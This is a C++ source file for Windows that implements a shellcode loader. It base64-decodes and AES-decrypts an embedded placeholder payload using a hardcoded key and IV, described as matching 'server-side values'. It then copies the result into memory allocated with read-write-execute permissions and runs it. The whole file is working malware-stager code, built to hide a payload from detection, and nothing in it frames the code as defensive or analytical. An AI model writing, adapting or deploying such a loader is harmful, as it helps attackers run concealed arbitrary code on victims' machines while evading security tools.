#include <windows.h>
#include <string>
#include <iostream>
#include <vector>
#include <wincrypt.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

std::string base64_decode(const std::string &encoded);
std::string decrypt_aes(const std::string &encrypted_data);
std::string encrypted_shellcode = "###ENCRYPTED_SHELLCODE###";

// AES key and IV (must match server-side values)
const BYTE AES_KEY[] = "ThisIsASecretKey"; // 16 bytes
const BYTE AES_IV[] = "ThisIsInitVector";  // 16 bytes

int main() {
    // First base64 decode, then decrypt AES
    std::string base64_decoded = base64_decode(encrypted_shellcode);
    std::string shellcode = decrypt_aes(base64_decoded);

    // Allocate memory with RWX permissions
    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        return 1;
    }

    // Copy shellcode to executable memory
    memcpy(exec, shellcode.c_str(), shellcode.size());

    // Execute shellcode
    ((void(*)())exec)();

    return 0;
}

// Base64 decoder implementation
std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

// AES decryption implementation using Windows CryptoAPI
std::string decrypt_aes(const std::string &encrypted_data) {
    std::string decrypted;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    
    // Get cryptographic provider
    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return "";
    }
    
    // Create hash object
    HCRYPTHASH hHash = 0;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Hash the key
    if (!CryptHashData(hHash, AES_KEY, 16, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Create AES key from hash
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Set IV
    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    if (!CryptSetKeyParam(hKey, KP_IV, AES_IV, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Prepare buffer for decryption
    DWORD data_len = encrypted_data.size();
    BYTE* pbData = new BYTE[data_len];
    memcpy(pbData, encrypted_data.c_str(), data_len);
    
    // Decrypt data in place
    if (!CryptDecrypt(hKey, 0, TRUE, 0, pbData, &data_len)) {
        delete[] pbData;
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    // Copy decrypted data
    decrypted.assign((char*)pbData, data_len);
    
    // Clean up
    delete[] pbData;
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return decrypted;
} 